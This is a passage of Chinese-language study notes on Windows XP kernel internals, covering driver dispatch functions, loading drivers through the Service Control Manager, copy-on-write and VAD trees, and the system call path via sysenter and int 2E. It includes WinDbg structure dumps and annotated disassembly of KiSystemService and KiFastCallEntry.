pDriverObject-\u003eMajorFunction[IRP_MJ_CLEANUP] = 派遣函数5; pDriverObject-\u003eMajorFunction[IRP_MJ_SET_INFORMATION] = 派遣函数6; pDriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = 派遣函数7; pDriverObject-\u003eMajorFunction[IRP_MJ_SHUTDOWN] = 派遣函数8; pDriverObject-\u003eMajorFunction[IRP_MJ_SYSTEM_CONTROL] = 派遣函数9; 派遣函数的格式\nNTSTATUS MyDispatchFunction(PDEVICE_OBJECT pDevObj, PIRP pIrp) { //处理自己的业务…… //设置返回状态 pIrp-\u003eIoStatus.Status = STATUS_SUCCESS; //GetLastError() 函数得到的就是该值 pIrp-\u003eIoStatus.Information = 0; //返回给3环多少数据 没有填0 IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS; } 驱动常用加载方式 注册驱动\nvoid CDriverLoadDlg::OnBnRegister() { CString path = this-\u003egetFilePath(); this-\u003escMageger = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (this-\u003escMageger == NULL) { MessageBox(__T(\"提示\"), __T(\"服务管理打开失败\")); return; } if (path.IsEmpty()) { MessageBox(_T(\"没有选择文件\"), _T(\"你要干什么\")); return; } CString fileName = this-\u003egetFileName(); SC_HANDLE serviceHandle = CreateService(this-\u003escMageger, fileName, fileName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL); //创建一个服务对象 if (serviceHandle == NULL) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_EXISTS) { MessageBox(_T(\"服务已经存在不需要创建了\"), _T(\"提示\")); } else { CString str; str.Format(L\"错误号为:%d\", error); MessageBox(str, _T(\"提示\")); OutputDebugString(str); } return; } CloseServiceHandle(serviceHandle); } 其中OpenSCManager是建立与本地计算机上的服务控制管理器的连接，CreateService是创建一个服务对象。\n运行驱动\nvoid CDriverLoadDlg::OnBnRun() { CString path = this-\u003egetFilePath();; if (path.IsEmpty()) { MessageBox(_T(\"没有选择文件\"), _T(\"你要干什么\")); return; } if (this-\u003escMageger == NULL) { MessageBox(_T(\"请重新启动，服务器打开失败\"), _T(\"你要干什么\")); return; } CString fileName = this-\u003egetFileName(); SC_HANDLE serviceHandle = OpenService(this-\u003escMageger, fileName, SERVICE_ALL_ACCESS); if (serviceHandle == NULL) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_DOES_NOT_EXIST) { MessageBox( _T(\"服务已经不存在\"),_T(\"提示\")); } else { CString str(\"错误号为:\"+error); MessageBox(str, _T(\"提示\")); } return; } int result = StartService(serviceHandle, 0, NULL); if (result == 0) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_ALREADY_RUNNING) { MessageBox(_T(\"已经运行\"),_T(\"提示\")); return; } } CloseServiceHandle(serviceHandle); } 打开服务之后开始服务就正常运行了。\n停止驱动\nvoid CDriverLoadDlg::OnBnStop() { CString path = this-\u003egetFilePath(); if (path.IsEmpty()) { MessageBox(_T(\"没有选择文件\"), _T(\"你要干什么\")); return; } if (this-\u003escMageger == NULL) { MessageBox(_T(\"请重新启动，服务器打开失败\"), _T(\"你要干什么\")); return; } CString fileName = this-\u003egetFileName(); SC_HANDLE serviceHandle = OpenService(this-\u003escMageger, fileName, SERVICE_ALL_ACCESS); if (serviceHandle == NULL) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_DOES_NOT_EXIST) { MessageBox(_T(\"服务不存在\"), _T(\"提示\")); } else { MessageBox(_T(\"未知错误\"), _T(\"提示\")); } return; } SERVICE_STATUS error = { 0 }; int result = ControlService(serviceHandle, SERVICE_CONTROL_STOP, \u0026error); if (result == 0) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_NOT_ACTIVE) { MessageBox(_T(\"服务没有在运行\"), _T(\"提示\")); } else { CString str(\"错误号为:\" + error); MessageBox(str, _T(\"提示\")); } } CloseServiceHandle(serviceHandle); } 打开服务之后用ControlService将驱动停止。\n卸载驱动\nvoid CDriverLoadDlg::OnBnUnload() { CString path = this-\u003egetFilePath(); if (path.IsEmpty()) { MessageBox(_T(\"没有选择文件\"), _T(\"你要干什么\")); return; } if (this-\u003escMageger == NULL) { MessageBox(_T(\"请重新启动，服务器打开失败\"), _T(\"你要干什么\")); return; } CString fileName = this-\u003egetFileName(); SC_HANDLE serviceHandle = OpenService(this-\u003escMageger, fileName, SERVICE_ALL_ACCESS); if (serviceHandle == NULL) { DWORD error = GetLastError(); if (error == ERROR_SERVICE_DOES_NOT_EXIST) { MessageBox( _T(\"服务已经不存在\"),_T(\"提示\")); } else { CString str(\"错误号为:\" + error); MessageBox(str, _T(\"提示\")); } return; } if (!DeleteService(serviceHandle)) { DWORD error = GetLastError(); CString str; str.Format(L\"错误号为:%d\", error); MessageBox(str, _T(\"提示\")); return; } CloseServiceHandle(serviceHandle); CloseServiceHandle(this-\u003escMageger); this-\u003escMageger = NULL; } 打开服务后调用DeleteService删除服务。\n写拷贝 首先两个进程加载同一个DLL时，那么他们都使用同一个物理页（也就是DLL的物理页）。\n之后如果想让这个DLL进行写拷贝，则必须让这个DLL的物理页变为只读的。\n这时如果要写的话就会产生异常，CPU就会判断是写拷贝的只读异常还是普通的只读异常。\n那么CPU如何判断呢？\n我们知道使用VirtualAlloc函数可以指定地址进行内存的分配，那么肯定有一个位置记录这块地址是否被占用。\n在windbg中使用指令dt _EPROCESS 地址可以看到一个结构体，在这个结构体中有一个成员是VadRoot。这个成员是一个二叉树的地址，这个二叉树的每个节点都记录着占用内存的开始位置、结束位置以及什么类型。\n+0x11c VadRoot : 0x895f5ac0 Void 虚拟地址使用情况查看（单位4kb）：\nkd\u003e !vad 0x895f5ac0 VAD Level Start End Commit 89887650 3 10 10 1 Private READWRITE 8957e138 4 20 20 1 Private READWRITE 89504ea8 2 30 12f 6 Private READWRITE 8964b9c0 4 130 132 0 Mapped READONLY Pagefile section, shared commit 0x3 8996eb90 3 140 141 0 Mapped READONLY Pagefile section, shared commit 0x2 898db370 5 150 24f 26 Private READWRITE 898a4c98 4 250 25f 6 Private READWRITE 89849768 6 260 26f 0 Mapped READWRITE Pagefile section, shared commit 0x3 89958180 5 270 285 0 Mapped READONLY \\WINDOWS\\system32\\unicode.nls 89439b78 7 290 2d0 0 Mapped READONLY \\WINDOWS\\system32\\locale.nls 89439b48 6 2e0 320 0 Mapped READONLY \\WINDOWS\\system32\\sortkey.nls 8982e460 8 330 335 0 Mapped READONLY \\WINDOWS\\system32\\sorttbls.nls 8982e430 7 340 380 0 Mapped READONLY Pagefile section, shared commit 0x41 895829d0 8 390 39f 5 Private READWRITE 89657368 9 3a0 3a2 0 Mapped READONLY \\WINDOWS\\system32\\ctype.nls 89932958 10 3b0 3bf 8 Private READWRITE 894cf498 11 3c0 3c0 1 Private READWRITE 8996ec58 12 3d0 3d0 1 Private READWRITE 898a6af0 14 3e0 3e1 0 Mapped READONLY Pagefile section, shared commit 0x2 898a6ac0 13 3f0 3f1 0 Mapped READONLY Pagefile section, shared commit 0x2 8964bae0 1 400 4ec 23 Mapped Exe EXECUTE_WRITECOPY \\Documents and Settings\\Administrator\\桌面\\DebugView\\Dbgview86_汉化.exe 89657338 3 4f0 5b7 0 Mapped EXECUTE_READ Pagefile section, shared commit 0x3 896572d8 2 5c0 6c2 0 Mapped READONLY Pagefile section, shared commit 0x103 8953b368 4 6d0 9cf 0 Mapped EXECUTE_READ Pagefile section, shared commit 0x1b 89649838 5 9d0 a1f 0 Mapped READONLY Pagefile section, shared commit 0x50 8955c3f0 6 a20 a20 0 Mapped READWRITE Pagefile section, shared commit 0x1 89656fd8 3 a30 a6f 0 Mapped READWRITE Pagefile section, shared commit 0x10 89656fa8 4 a70 a7d 0 Mapped READWRITE Pagefile section, shared commit 0xe 894e3ea8 5 a80 b7f 167 Private READWRITE 895f5ac0 0 b80 b80 1 Private READWRITE 8996eeb0 7 b90 b90 0 Private Phys READWRITE 898740d8 6 ba0 ba0 0 Mapped READWRITE Pagefile section, shared commit 0x1 89578590 5 bd0 c4f 1 Private READWRITE 895353a0 7 c50 d4f 2 Private READWRITE 89441280 6 d60 d67 8 Private READWRITE 8993afd8 7 d70 def 0 Mapped READWRITE Pagefile section, shared commit 0x7 89649808 4 5adc0 5adf6 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\uxtheme.dll 8953b338 3 62c20 62c28 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\lpk.dll 89876308 2 71a10 71a17 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\ws2help.dll 8982e400 3 71a20 71a36 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\ws2_32.dll 898762d8 6 71a90 71aa1 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\mpr.dll 89656f78 11 73640 7366d 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\MSCTFIME.IME 8953b308 10 73fa0 7400a 16 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\usp10.dll 89828008 11 74680 746cb 3 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\MSCTF.dll 89657308 9 76300 7631c 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\imm32.dll 89874078 8 76320 76366 4 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\comdlg32.dll 89656f48 9 76990 76acc 8 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\ole32.dll 895f5900 7 77180 77282 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\WinSxS\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\\comctl32.dll 89876338 5 77be0 77c37 7 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\msvcrt.dll 8964b960 6 77d10 77d9f 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\user32.dll 8982e3d0 4 77da0 77e48 5 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\advapi32.dll 8982e3a0 5 77e50 77ee1 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\rpcrt4.dll 89874008 7 77ef0 77f38 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\gdi32.dll 898740a8 8 77f40 77fb5 2 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\shlwapi.dll 89876368 6 77fc0 77fd0 1 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\secur32.dll 894b5238 1 7c800 7c91d 5 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\kernel32.dll 8996ed28 2 7c920 7c9b2 5 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\ntdll.dll 89874048 5 7d590 7dd83 30 Mapped Exe EXECUTE_WRITECOPY \\WINDOWS\\system32\\shell32.dll 8996eb60 4 7f6f0 7f7ef 0 Mapped EXECUTE_READ Pagefile section, shared commit 0x7 8964b9f0 3 7ffa0 7ffd2 0 Mapped READONLY Pagefile section, shared commit 0x33 8996ea98 4 7ffd4 7ffd4 1 Private READWRITE 895f5a80 6 7ffde 7ffde 1 Private READWRITE 8996eb00 5 7ffdf 7ffdf 1 Private READWRITE 申请内存只有两个函数：VirtualAlloc与FileMapping（共享内存）。之前的malloc函数只是在上面的那一堆内存中划一块来使用\n其实就是产生异常，CPU判断是不是写拷贝，如果是的话就分配一个新的物理页，拷贝过去并使用新物理页。如果没有异常自然就不会有后面的操作了。\n系统调用 进0环前 _KUSER_SHARED_DATA\nUser层和Kernel层分别定义了一个_KUSER_SHARED_DATA结构区域，用于User层和Kernel层共享某些数据。（共享区域有多大取决于这个结构体有多大） 它们使用固定的地址值映射，_KUSER_SHARED_DATA结构区域在User和Kernel层地址分别为： User层地址为：0x7ffe0000 Kernnel层地址为：0xffdf0000 虽然指向的是同一个物理页，但在User层是只读的，在Kernnel层是可写的。 NtReadVirtualMemory\n在ntdll中如下：\n.text:7C92D9E0 public ZwReadVirtualMemory .text:7C92D9E0 ZwReadVirtualMemory proc near ; CODE XREF: LdrFindCreateProcessManifest+1CC↓p .text:7C92D9E0 ; LdrCreateOutOfProcessImage+7C↓p ... .text:7C92D9E0 mov eax, 0BAh ; NtReadVirtualMemory（服务号） .text:7C92D9E5 mov edx, 7FFE0300h .text:7C92D9EA call dword ptr [edx] .text:7C92D9EC retn 14h .text:7C92D9EC ZwReadVirtualMemory endp 可以看到是call了0x7FFE0300地址的代码，这个位置就是_KUSER_SHARED_DATA结构体第0x300偏移。\n使用dt _KUSER_SHARED_DATA 0x7ffe0000找0x300偏移处为：\n+0x300 SystemCall : 0x7c92e4f0 使用u 0x7c92e4f0应该可以找到如下：\n.text:7C92E4F0 public KiFastSystemCall .text:7C92E4F0 KiFastSystemCall proc near ; DATA XREF: .text:off_7C923428↑o .text:7C92E4F0 mov edx, esp ;保存esp寄存器 .text:7C92E4F2 sysenter .text:7C92E4F2 KiFastSystemCall endp 或者：\n.text:7C92E500 public KiIntSystemCall .text:7C92E500 KiIntSystemCall proc near ; DATA XREF: .text:off_7C923428↑o .text:7C92E500 .text:7C92E500 arg_4 = byte ptr 8 .text:7C92E500 .text:7C92E500 lea edx, [esp+arg_4] .text:7C92E504 int 2Eh ; DOS 2+ internal - EXECUTE COMMAND .text:7C92E504 ; DS:SI -\u003e counted CR-terminated command string .text:7C92E506 retn .text:7C92E506 KiIntSystemCall endp CPU会判断系统支不支持sysenter指令，支持就在之前0x300偏移处写入KiFastSystemCall；不支持就会填入KiIntSystemCall\n当通过eax=1来执行cpuid指令时，处理器的特征信息被放在ecx和edx寄存器中，其中edx包含了一个SEP位（11位），该位指明了当前处理器知否支持sysenter/sysexit指令。 如果是KiIntSystemCall的形式进R0的话，需要查IDT表。在0x2E*8处为KiSystemService（用中断门拆段选择子）。\n快速调用\n中断门进0环，需要的CS、EIP在IDT表中，需要查内存（SS与ESP由TSS提供，参数在栈里面）而CPU如果支持sysenter指令时，操作系统会提前将CS/SS/ESP/EIP的值存储在MSR寄存器中，sysenter指令执行时，CPU会将MSR寄存器中的值直接写入相关寄存器，没有读内存的过程，所以叫快速调用，本质是一样的！\n在执行sysenter指令之前，操作系统必须指定0环的CS段、SS段、EIP以及ESP。而在未公开的MSR寄存器中就存着这些值：\nMSR Index IA32_SYSENTER_CS 174H IA32_SYSENTER_ESP 175H IA32_SYSENTER_EIP 176H 然后SS是经过计算得到：CS的值+8\n在windbg中可以使用rdmsr xxx指令查看对应的MSR寄存器，通过这种方式进内核的函数为KiFastCallEntry\n总结：\n通过中断门进0环： 固定中断号为0x2E CS/EIP由门描述符提供，ESP/SS由TSS提供 进0环后执行的内核函数：NT!KiSystemService 通过sysenter进0环： CS/ESP/EIP由MSR寄存器提供（SS是算出来的） 进入0环后执行的内核函数：NT!KiFastCallEntry 进0环后（保存现场） 几个重要的结构体：\nTrap_Frame\n无论使用这两种方式的哪一种进0环，在三环的寄存器都会存到这个结构体中。由windows操作系统维护的。\nkd\u003e dt _KTrap_Frame nt!_KTRAP_FRAME +0x000 DbgEbp : Uint4B +0x004 DbgEip : Uint4B +0x008 DbgArgMark : Uint4B +0x00c DbgArgPointer : Uint4B +0x010 TempSegCs : Uint4B +0x014 TempEsp : Uint4B +0x018 Dr0 : Uint4B +0x01c Dr1 : Uint4B +0x020 Dr2 : Uint4B +0x024 Dr3 : Uint4B +0x028 Dr6 : Uint4B +0x02c Dr7 : Uint4B +0x030 SegGs : Uint4B +0x034 SegEs : Uint4B +0x038 SegDs : Uint4B +0x03c Edx : Uint4B +0x040 Ecx : Uint4B +0x044 Eax : Uint4B +0x048 PreviousMode : Uint4B +0x04c ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD +0x050 SegFs : Uint4B +0x054 Edi : Uint4B +0x058 Esi : Uint4B +0x05c Ebx : Uint4B +0x060 Ebp : Uint4B +0x064 ErrCode : Uint4B +0x068 Eip : Uint4B +0x06c SegCs : Uint4B +0x070 EFlags : Uint4B +0x074 HardwareEsp : Uint4B +0x078 HardwareSegSs : Uint4B +0x07c V86Es : Uint4B +0x080 V86Ds : Uint4B +0x084 V86Fs : Uint4B +0x088 V86Gs : Uint4B _ETHREAD\n线程相关的结构体。\nkd\u003e dt _ETHREAD nt!_ETHREAD +0x000 Tcb : _KTHREAD +0x1c0 CreateTime : _LARGE_INTEGER +0x1c0 NestedFaultCount : Pos 0, 2 Bits +0x1c0 ApcNeeded : Pos 2, 1 Bit +0x1c8 ExitTime : _LARGE_INTEGER +0x1c8 LpcReplyChain : _LIST_ENTRY +0x1c8 KeyedWaitChain : _LIST_ENTRY +0x1d0 ExitStatus : Int4B +0x1d0 OfsChain : Ptr32 Void +0x1d4 PostBlockList : _LIST_ENTRY +0x1dc TerminationPort : Ptr32 _TERMINATION_PORT +0x1dc ReaperLink : Ptr32 _ETHREAD +0x1dc KeyedWaitValue : Ptr32 Void +0x1e0 ActiveTimerListLock : Uint4B +0x1e4 ActiveTimerListHead : _LIST_ENTRY +0x1ec Cid : _CLIENT_ID +0x1f4 LpcReplySemaphore : _KSEMAPHORE +0x1f4 KeyedWaitSemaphore : _KSEMAPHORE +0x208 LpcReplyMessage : Ptr32 Void +0x208 LpcWaitingOnPort : Ptr32 Void +0x20c ImpersonationInfo : Ptr32 _PS_IMPERSONATION_INFORMATION +0x210 IrpList : _LIST_ENTRY +0x218 TopLevelIrp : Uint4B +0x21c DeviceToVerify : Ptr32 _DEVICE_OBJECT +0x220 ThreadsProcess : Ptr32 _EPROCESS +0x224 StartAddress : Ptr32 Void +0x228 Win32StartAddress : Ptr32 Void +0x228 LpcReceivedMessageId : Uint4B +0x22c ThreadListEntry : _LIST_ENTRY +0x234 RundownProtect : _EX_RUNDOWN_REF +0x238 ThreadLock : _EX_PUSH_LOCK +0x23c LpcReplyMessageId : Uint4B +0x240 ReadClusterSize : Uint4B +0x244 GrantedAccess : Uint4B +0x248 CrossThreadFlags : Uint4B +0x248 Terminated : Pos 0, 1 Bit +0x248 DeadThread : Pos 1, 1 Bit +0x248 HideFromDebugger : Pos 2, 1 Bit +0x248 ActiveImpersonationInfo : Pos 3, 1 Bit +0x248 SystemThread : Pos 4, 1 Bit +0x248 HardErrorsAreDisabled : Pos 5, 1 Bit +0x248 BreakOnTermination : Pos 6, 1 Bit +0x248 SkipCreationMsg : Pos 7, 1 Bit +0x248 SkipTerminationMsg : Pos 8, 1 Bit +0x24c SameThreadPassiveFlags : Uint4B +0x24c ActiveExWorker : Pos 0, 1 Bit +0x24c ExWorkerCanWaitUser : Pos 1, 1 Bit +0x24c MemoryMaker : Pos 2, 1 Bit +0x250 SameThreadApcFlags : Uint4B +0x250 LpcReceivedMsgIdValid : Pos 0, 1 Bit +0x250 LpcExitThreadCalled : Pos 1, 1 Bit +0x250 AddressSpaceOwner : Pos 2, 1 Bit +0x254 ForwardClusterOnly : UChar +0x255 DisablePageFaultClustering : UChar +0x258 KernelStackReference : Uint4B 其中，Tcb成员又是一个子结构体：\nkd\u003e dt _KTHREAD nt!_KTHREAD +0x000 Header : _DISPATCHER_HEADER +0x010 MutantListHead : _LIST_ENTRY +0x018 InitialStack : Ptr32 Void +0x01c StackLimit : Ptr32 Void +0x020 Teb : Ptr32 Void +0x024 TlsArray : Ptr32 Void +0x028 KernelStack : Ptr32 Void +0x02c DebugActive : UChar +0x02d State : UChar +0x02e Alerted : [2] UChar +0x030 Iopl : UChar +0x031 NpxState : UChar +0x032 Saturation : Char +0x033 Priority : Char +0x034 ApcState : _KAPC_STATE +0x04c ContextSwitches : Uint4B +0x050 IdleSwapBlock : UChar +0x051 VdmSafe : UChar +0x052 Spare0 : [2] UChar +0x054 WaitStatus : Int4B +0x058 WaitIrql : UChar +0x059 WaitMode : Char +0x05a WaitNext : UChar +0x05b WaitReason : UChar +0x05c WaitBlockList : Ptr32 _KWAIT_BLOCK +0x060 WaitListEntry : _LIST_ENTRY +0x060 SwapListEntry : _SINGLE_LIST_ENTRY +0x068 WaitTime : Uint4B +0x06c BasePriority : Char +0x06d DecrementCount : UChar +0x06e PriorityDecrement : Char +0x06f Quantum : Char +0x070 WaitBlock : [4] _KWAIT_BLOCK +0x0d0 LegoData : Ptr32 Void +0x0d4 KernelApcDisable : Uint4B +0x0d8 UserAffinity : Uint4B +0x0dc SystemAffinityActive : UChar +0x0dd PowerState : UChar +0x0de NpxIrql : UChar +0x0df InitialNode : UChar +0x0e0 ServiceTable : Ptr32 Void +0x0e4 Queue : Ptr32 _KQUEUE +0x0e8 ApcQueueLock : Uint4B +0x0f0 Timer : _KTIMER +0x118 QueueListEntry : _LIST_ENTRY +0x120 SoftAffinity : Uint4B +0x124 Affinity : Uint4B +0x128 Preempted : UChar +0x129 ProcessReadyQueue : UChar +0x12a KernelStackResident : UChar +0x12b NextProcessor : UChar +0x12c CallbackStack : Ptr32 Void +0x130 Win32Thread : Ptr32 Void +0x134 TrapFrame : Ptr32 _KTRAP_FRAME +0x138 ApcStatePointer : [2] Ptr32 _KAPC_STATE +0x140 PreviousMode : Char +0x141 EnableStackSwap : UChar +0x142 LargeStack : UChar +0x143 ResourceIndex : UChar +0x144 KernelTime : Uint4B +0x148 UserTime : Uint4B +0x14c SavedApcState : _KAPC_STATE +0x164 Alertable : UChar +0x165 ApcStateIndex : UChar +0x166 ApcQueueable : UChar +0x167 AutoAlignment : UChar +0x168 StackBase : Ptr32 Void +0x16c SuspendApc : _KAPC +0x19c SuspendSemaphore : _KSEMAPHORE +0x1b0 ThreadListEntry : _LIST_ENTRY +0x1b8 FreezeCount : Char +0x1b9 SuspendCount : Char +0x1ba IdealProcessor : UChar +0x1bb DisableBoost : UChar KPCR\nCPU控制区（Processor Control Region），描述当前CPU的各种状态\nkd\u003e dt _KPCR nt!_KPCR +0x000 NtTib : _NT_TIB +0x01c SelfPcr : Ptr32 _KPCR +0x020 Prcb : Ptr32 _KPRCB +0x024 Irql : UChar +0x028 IRR : Uint4B +0x02c IrrActive : Uint4B +0x030 IDR : Uint4B +0x034 KdVersionBlock : Ptr32 Void +0x038 IDT : Ptr32 _KIDTENTRY +0x03c GDT : Ptr32 _KGDTENTRY +0x040 TSS : Ptr32 _KTSS +0x044 MajorVersion : Uint2B +0x046 MinorVersion : Uint2B +0x048 SetMember : Uint4B +0x04c StallScaleFactor : Uint4B +0x050 DebugActive : UChar +0x051 Number : UChar +0x052 Spare0 : UChar +0x053 SecondLevelCacheAssociativity : UChar +0x054 VdmAlert : Uint4B +0x058 KernelReserved : [14] Uint4B +0x090 SecondLevelCacheSize : Uint4B +0x094 HalReserved : [16] Uint4B +0x0d4 InterruptMode : Uint4B +0x0d8 Spare1 : UChar +0x0dc KernelReserved2 : [17] Uint4B +0x120 PrcbData : _KPRCB _KiSystemServise\n可以对比下面的这张图（紫色的成员在保护模式下没有被使用）：\n.text:00407631 _KiSystemService proc near ; CODE XREF: ZwAcceptConnectPort(x,x,x,x,x,x)+C↑p .text:00407631 ; ZwAccessCheck(x,x,x,x,x,x,x,x)+C↑p ... .text:00407631 .text:00407631 arg_0 = dword ptr 4 .text:00407631 .text:00407631 push 0 ; 在执行这一行时0x68~0x78已经压入栈中了，所以这个0是压入ErrCode .text:00407633 push ebp .text:00407634 push ebx .text:00407635 push esi .text:00407636 push edi .text:00407637 push fs ; 到这里是压入图中绿色的寄存器（到0x50） .text:00407639 mov ebx, 30h ; '0' .text:0040763E mov fs, ebx ; 将0x30作为段选择子加载到FS段寄存器中 .text:0040763E ; 0x30 =\u003e 0011 0 0 00 .text:0040763E ; 是查GDT表索引为6的段描述符： .text:0040763E ; ffc093df`f0000001 .text:0040763E ; addr = ffdff000 .text:0040763E ; addr指向cpu的_KPCR结构 .text:00407640 push dword ptr ds:0FFDFF000h ; 压入旧的ExecptionList(图中的0x4c) .text:00407640 ; 就是第一个子成员的第一个成员（_KPCR[0] =\u003e _TIB[0] =\u003e ExecptionList） .text:00407646 mov dword ptr ds:0FFDFF000h, -1 ; 将新的ExecptionList置为-1 .text:00407650 mov esi, ds:0FFDFF124h ; _KPCR[0x120] =\u003e _KPCB[0x4] =\u003e CurrentThread(当前CPU所执行线程的_ETHREAD) .text:00407656 push dword ptr [esi+140h] ; _ETHREAD[0x140] =\u003e _KTHREAD[0x140] =\u003e PreviousMode(先前模式) .text:0040765C sub esp, 48h ; 提升堆栈到图中的0x00的位置 .text:0040765F mov ebx, [esp+68h+arg_0] ; 就是0x6c的位置，是之前CS的值 .text:00407663 and ebx, 1 ; 0环最低位为0，3环最低位为1 .text:00407666 mov [esi+140h], bl ; 存入新的\"先前模式\" .text:0040766C mov ebp, esp ; 将ebp也改为指向图中0x00的位置 .text:0040766E mov ebx, [esi+134h] ; ebx指向_KTHREAD[0x134] =\u003e TrapFrame .text:00407674 mov [ebp+3Ch], ebx ; 将TrapFrame临时存在edx（_Trap_Frame[0x3c] =\u003e edx）中 .text:00407677 mov [esi+134h], ebp ; 将新的TrapFrame写回 .text:0040767D cld ; Clear Direction Flag .text:0040767E mov ebx, [ebp+60h] ; ebx = ebp（三环） .text:00407681 mov edi, [ebp+68h] ; edi = eip（三环） .text:00407684 mov [ebp+0Ch], edx .text:00407687 mov dword ptr [ebp+8], 0BADB0D00h ; 存入标志 .text:0040768E mov [ebp+0], ebx ; 存入调试ebp .text:00407691 mov [ebp+4], edi ; 存入调试eip .text:00407694 test byte ptr [esi+2Ch], 0FFh ; 判断是否是调试状态（DebugActive == -1） .text:00407698 jnz Dr_kss_a ; 是，跳过去的流程主要是将调试寄存器dr0~dr7赋值（0x18~0x2c） .text:0040769E .text:0040769E loc_40769E: ; CODE XREF: Dr_kss_a+10↑j .text:0040769E ; Dr_kss_a+7C↑j .text:0040769E sti ; Set Interrupt Flag .text:0040769F jmp loc_407781 ; _KiFastCallEntry的后面 .text:0040769F _KiSystemService endp _KiFastCallEntry\n.text:004076F0 _KiFastCallEntry proc near ; DATA XREF: _KiTrap01+6F↓o .text:004076F0 ; KiLoadFastSyscallMachineSpecificRegisters(x)+24↓o .text:004076F0 .text:004076F0 var_B = byte ptr -0Bh .text:004076F0 .text:004076F0 ; FUNCTION CHUNK AT .text:004076C8 SIZE 00000023 BYTES .text:004076F0 ; FUNCTION CHUNK AT .text:00407990 SIZE 00000014 BYTES .text:004076F0 .text:004076F0 mov ecx, 23h ; '#' .text:004076F5 push 30h ; '0' .text:004076F7 pop fs ; 一样将fs置为0x30 .text:004076F9 mov ds, ecx .text:004076FB mov es, ecx ; 将ds和es都置为0x23 .text:004076FD mov ecx, ds:0FFDFF040h ; 将ecx置为_KPCR[0x40] =\u003e TSS .text:00407703 mov esp, [ecx+4] ; 将esp置为TSS[0x4] =\u003e esp0 .text:00407706 push 23h ; '#' ; 存入0x23作为ss（三环） .text:00407708 push edx ; 存入edx作为esp（三环） .text:00407709 pushf ; Push Flags Register onto the Stack .text:0040770A .text:0040770A loc_40770A: ; CODE XREF: _KiFastCallEntry2+22↑j .text:0040770A push 2 ; 存入cs（三环） .text:0040770C add edx, 8 ; Add .text:0040770F popf ; eflag = 2 .text:00407710 or [esp+0Ch+var_B], 2 ; 设置存入的eflag的第二个位 .text:00407715 push 1Bh ; cs = 0x1b .text:00407717 push dword ptr ds:0FFDF0304h .text:0040771D push 0 ; ErrCode = 0 .text:0040771F push ebp .text:00407720 push ebx .text:00407721 push esi .text:00407722 push edi ; 对应存入直到图中的0x54 .text:00407723 mov ebx, ds:0FFDFF01Ch ; ebx = _KPCR.SelfPcr（就是_KPCR自己的起始地址） .text:00407729 push 3Bh ; ';' ; fs = 0x3b .text:0040772B mov esi, [ebx+124h] ; esi = _KPCRB.CurrentThread .text:00407731 push dword ptr [ebx] ; 保存旧ExceptionList .text:00407733 mov dword ptr [ebx], -1 ; 将新的ExceptionList置为-1 .text:00407739 mov ebp, [esi+18h] ; ebp = _KTHREAD.InitialStack .text:0040773C push 1 ; 将先前模式位置为1 .text:0040773E sub esp, 48h ; esp指向TrapFrame开始位置 .text:00407741 sub ebp, 29Ch ; Integer Subtraction .text:00407747 mov byte ptr [esi+140h], 1 ; 将先前模式置为1 .text:0040774E cmp ebp, esp ; Compare Two Operands .text:00407750 jnz loc_4076C8 ; Jump if Not Zero (ZF=0) .text:00407756 and dword ptr [ebp+2Ch], 0 ; Logical AND .text:0040775A test byte ptr [esi+2Ch], 0FFh ; DebugActive == -1 ？ .text:0040775E mov [esi+134h], ebp ; 替换TrapFrame .text:00407764 jnz Dr_FastCallDrSave ; 是，跳过去的流程主要是将调试寄存器dr0~dr7赋值 .text:0040776A .text:0040776A loc_40776A: ; CODE XREF: Dr_FastCallDrSave+10↑j .text:0040776A ; Dr_FastCallDrSave+7C↑j .text:0040776A mov ebx, [ebp+60h] ; ebx = TrapFrame.Ebp .text:0040776D mov edi, [ebp+68h] ; edi = TrapFrame.Eip .text:00407770 mov [ebp+0Ch], edx .text:00407773 mov dword ptr [ebp+8], 0BADB0D00h .text:0040777A mov [ebp+0], ebx .text:0040777D mov [ebp+4], edi ; 赋值调试的寄存器0x00~0xc .text:00407780 sti ; Set Interrupt Flag SystemServiceTable（系统服务表） 如何根据系统服务号（eax中存储）找到要执行的内核函数？调用时参数是存储到3环的堆栈，如何传递给内核函数？\n结构如下：\nServiceTable：存储了一个指针，指向函数地址表（存储函数的地址，4字节）。 Count： 当前系统服务表调用了多少次。 ServiceLimit：系统服务表中一共有多少个函数。 ArgmentTable：存储了一个指针，指向函数参数表（函数有几个字节参数，1字节）。 